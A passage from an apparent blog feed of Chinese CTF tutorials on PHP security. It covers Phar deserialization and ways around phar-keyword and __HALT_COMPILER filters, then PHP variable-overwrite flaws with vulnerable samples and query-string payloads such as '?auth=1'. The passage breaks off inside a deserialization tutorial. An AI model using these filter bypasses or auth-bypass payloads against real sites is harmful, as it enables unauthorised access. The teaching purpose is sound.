class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//要压缩的文件</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$obj</span>);  <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在浏览器上访问此文件生成test.phar文件，用010editor查看<br><a href="https://img-blog.csdnimg.cn/21b23d09b7ad4d0cb95087e6351e3ac1.png"><img src="D:/mdimage/21b23d09b7ad4d0cb95087e6351e3ac1.png" alt="在这里插入图片描述"></a> </p><h2 id="4-2-绕过phar关键字检测"><a href="#4-2-绕过phar关键字检测" class="headerlink" title="4.2 绕过phar关键字检测"></a>4.2 绕过phar关键字检测</h2><p>Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为<code>Phar://xxx</code>来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">if (preg_match(&quot;/</span><span class="hljs-keyword">^php</span><span class="language-xml">|</span><span class="hljs-keyword">^file</span><span class="language-xml">|</span><span class="hljs-keyword">^phar</span><span class="language-xml">|</span><span class="hljs-keyword">^dict</span><span class="language-xml">|</span><span class="hljs-keyword">^zip</span><span class="language-xml">/i&quot;,</span><span class="hljs-variable">$filename</span><span class="language-xml">)&#123;</span><br><span class="language-xml">    die();</span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p>绕过的话，我们的办法是使用各种协议来进行绕过，具体如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phar:<span class="hljs-regexp">//</span>test.phar<br><span class="hljs-regexp">//</span>即使用filter伪协议来进行绕过<br><span class="hljs-number">2</span>、compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用bzip2协议来进行绕过<br><span class="hljs-number">3</span>、compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用zlib协议进行绕过<br></code></pre></td></tr></table></figure><h2 id="4-3-绕过-HALT-COMPILER检测"><a href="#4-3-绕过-HALT-COMPILER检测" class="headerlink" title="4.3 绕过__HALT_COMPILER检测"></a>4.3 绕过__HALT_COMPILER检测</h2><p>我们在前文初识Phar时就提到过，PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么出于安全考虑，即为了防止Phar反序列化的出现，可能就会对这个进行过滤，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,<span class="hljs-variable">$Phar</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的话绕过思路有两个<br>1、将Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//接着，代码使用 setArchiveComment() 方法将序列化后的 $a 变量作为压缩包的注释，也就是将序列化的数据作为整个压缩包的一个元数据。</span><br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/Decemberus.github-io/2021/11/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/Decemberus.github-io/2021/11/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP变量覆盖漏洞"><a href="#PHP变量覆盖漏洞" class="headerlink" title="PHP变量覆盖漏洞"></a>PHP变量覆盖漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>自定义的参数值替换原有变量值的情况称为变量覆盖漏洞</strong></p><p>经常导致变量覆盖漏洞场景有：<code>$$</code>使用不当，<code>extract()</code>函数使用不当，<code>parse_str()</code>函数使用不当，<code>import_request_variables()</code>使用不当，开启了全局变量注册等</p><h2 id="导致的变量覆盖问题"><a href="#导致的变量覆盖问题" class="headerlink" title="$$导致的变量覆盖问题"></a>$$导致的变量覆盖问题</h2><p>在php中，$$这种写法被称为可变变量。可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">举个例子<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$x</span> = <span class="hljs-string">&quot;helenchan&quot;</span>;<br><span class="hljs-variable">$$x</span> = <span class="hljs-number">666</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$x</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$helenchan</span>;<br><span class="hljs-meta">?&gt;</span><br>其实就是$(<span class="hljs-variable">$x</span>),变量x的值是可变变量的变量名的意思<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\1-16650609034581.png" alt="img"></p><p>比如再看下面这个例子</p><p><code>$$</code>导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;_COOKIE&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_GET&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)  <br>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span>=&gt;<span class="hljs-variable">$_value</span>)  <br>    &#123;<br>        <span class="hljs-variable">$$_key</span>=  <span class="hljs-variable">$_value</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>) ? <span class="hljs-variable">$id</span> : <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span> === <span class="hljs-string">&quot;helenchan&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NO flag.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>在这个php代码里，GET、POST或COOKIE都能触发变量覆盖漏洞，传入id=helenchan后，在<span class="hljs-keyword">foreach</span>语句中，<span class="hljs-variable">$_key</span>为id，<span class="hljs-variable">$_value</span>为helenchan，进而<span class="hljs-variable">$$_key</span>为<span class="hljs-variable">$id</span>，从而实现了变量覆盖<br></code></pre></td></tr></table></figure><h2 id="extract-函数使用不当"><a href="#extract-函数使用不当" class="headerlink" title="extract()函数使用不当"></a>extract()函数使用不当</h2><p>1.extract()函数<br>extract() 函数从数组中将<strong>变量导入到当前的符号表</strong>。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。</p><p>2.语法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">(array,extract_rules,prefix)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定要使用的数组。</td></tr><tr><td align="left"><em>extract_rules</em></td><td align="left">可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP - 如果有冲突，不覆盖已有的变量。EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td align="left"><em>prefix</em></td><td align="left">可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p>注意，flags参数默认为<code>EXTR_OVERWRITE</code>，如果有冲突，覆盖原来的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$auth</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$auth</span> == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;private&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;public&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞<br>在这个例子里，extract()从$_GET中导出变量，从而可以导致任意变量被覆盖。<br>我们只要输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">auth</span>=3<br></code></pre></td></tr></table></figure><p>就可以实现目的</p><p>再来看一个小题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$mypwd</span>))<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mypwd</span>==<span class="hljs-variable">$pwd</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">pwd</span>=1&amp;mypwd=1<br></code></pre></td></tr></table></figure><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p><code>parse_str()</code> 函数把字符串解析成多个变量。其作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量<br>注意：当 <code>magic_quotes_gpc = On</code>，那么在 <code>parse_str()</code> 解析之前，变量会被 <code>addslashes()</code> 转换(也就是会被转义，加反斜线)。</p><p><code>parse_str(string[,array])</code>，两个参数分别为：</p><ul><li>string<br>输入的字符串。如果 <code>str</code> 是 <code>URL</code> 传递入的查询字符串(<code>query string</code>)，则将它解析为变量并设置到当前作用域(如果提供了 <code>array</code> 则会设置到该数组里)<br>注意，<code>php &gt;= 7.2</code>，如果不设置该参数，该函数将失效</li><li>array<br>一个数组，如果设置该参数， 变量将会以数组元素的形式存入到这个数组，作为替代</li></ul><p>下面看一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#phpinfo();</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">2</span>;<br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&#x27;a=1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=xiaoming&amp;age=22&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1xiaoming<br>22<br></code></pre></td></tr></table></figure><p>所以需要降低版本来测试，但是ctf里本来就是大概在4.0-5.0的版本的php，很少有超过7.0版本的题目。</p><p>按正常情况，变量a应该会被重新赋值为1，实现变量覆盖,造成漏洞泄露</p><p>再来看一个题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<br><span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;                    <br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);           <br><span class="hljs-keyword">die</span>();                                       <br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">include</span> (‘./flag.php’);<br><span class="hljs-variable">$a</span> = “https:<span class="hljs-comment">//www.cnblogs.com/wjrblogs/”;</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != ‘QNKCDZO’ &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(‘QNKCDZO’)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(‘其实很简单其实并不难！’);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用 <code>php</code> 的 <code>hash</code> 比较缺陷(<code>PHP</code> 在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0E</code>开头的哈希值都解释为 <code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0E</code>开头的，那么PHP将会认为他们相同，都是 <code>0</code>)，所以，只需要找一个字符串哈希后以 <code>OE</code> 开头即可。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a<br></code></pre></td></tr></table></figure><h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><p><code>import_request_variables()</code>函数将 <code>GET/POST/Cookie</code> 变量导入到全局作用域中，当禁止了 <code>register_globals</code>，但又想用到一些全局变量，那么此函数就很有用</p><p><code>import_request_variables(string[,prefix])</code>，两个参数分别为：</p><ul><li>string<br>指定导入哪些变量为全局变量，可以用字母 <code>G</code>、<code>P</code> 和 <code>C</code> 分别表示导入 <code>GET</code>、<code>POST</code> 和 <code>Cookie</code> 中的变量。这些字母不区分大小写，所以你可以使用 <code>g</code>、<code>p</code> 和 <code>c</code> 的任何组合。<code>POST</code> 包含了通过 <code>POST</code> 方法上传的文件信息。注意这些字母的顺序，当使用 <code>gp</code> 时，<code>POST</code> 变量将使用相同的名字覆盖 <code>GET</code> 变量。任何 <code>GPC</code> 以外的字母都将被忽略</li><li>prefix<br><code>prefix</code> 参数作为变量名的前缀，置于所有被导入到全局作用域的变量之前</li></ul><p>小例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-title function_ invoke__">import_request_variables</span>(<span class="hljs-string">&#x27;G&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$auth</span>== <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;登陆成功&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;登陆失败&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">auth</span>=1<br></code></pre></td></tr></table></figure><h2 id="全局变量覆盖（register-globals）"><a href="#全局变量覆盖（register-globals）" class="headerlink" title="全局变量覆盖（register_globals）"></a>全局变量覆盖（register_globals）</h2><p>在 PHP5.3 之前，默认开启；PHP5.3 默认关闭，PHP5.6 及 5.7 已经被移除</p><p>当 <code>register_globals</code> 全局变量设置开启时，传递过来的值(<code>POST/GET/Cookie</code>)会被直接注册为全局变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;1ndex&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>] == <span class="hljs-string">&quot;1ndex&quot;</span>)&#123;<br><span class="hljs-variable">$authorized</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$authorized</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Success&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>register_globals=Off</code>时，只能通过提交正确的账号密码才可成功登陆，也就是<code>http://127.0.0.1/blfg.php?username=1ndex&amp;password=1ndex</code></p><p>当<code>register_globals=On</code>时，可以无需账号密码通过验证，只需要将变量<code>authorized</code>设置为<code>真</code>即可，可为<code>http://127.0.0.1/blfg.php?authorized=1</code>或者<code>http://127.0.0.1/blfg.php?GLOBALS[authorized]=1</code><br>当<code>register_globals=Off</code>时，该方法无效</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/Decemberus.github-io/2021/11/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/Decemberus.github-io/2021/11/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p>关于php面向对象编程<br>对象：可以对其做事情的一些东西。一个对象有<strong>状态、行为和标识</strong>三种属性。<br>类：一个共享相同结构和行为的对象的集合。<br>每个类的定义都以关键字class开头，后面跟着类的名字。一个类可以包含有属于自己的变量，变量（称为“属性”）以及函数（“称为方法”）。类定义了一件事物的抽象特点。通常来说，类定义了事物的属性和它可以做到的。类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号“_”开头的，比如<code>_construct</code>,<code>_destruct</code>,<code>_toString</code>,<code>_sleep</code>,<code>_wakeup</code>等。这些函数在某些情况下会自动调用，比如：<code>_construct</code>当一个对象创建时调用（constructor）；<code>_destruct</code>当一个对象被销毁时调用（destructor）；<code>_toString</code>当一个对象被当作一个字符串时使用。</p><h2 id="php对象"><a href="#php对象" class="headerlink" title="php对象"></a>php对象</h2><p>我们先创建一个简单的php对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个简单的方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test.php</span><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20190323121940213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>接下来开始尝试使用magic函数，在类中添加一个magic函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//一个变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br>    <span class="hljs-comment">//一个简单的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//Constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span 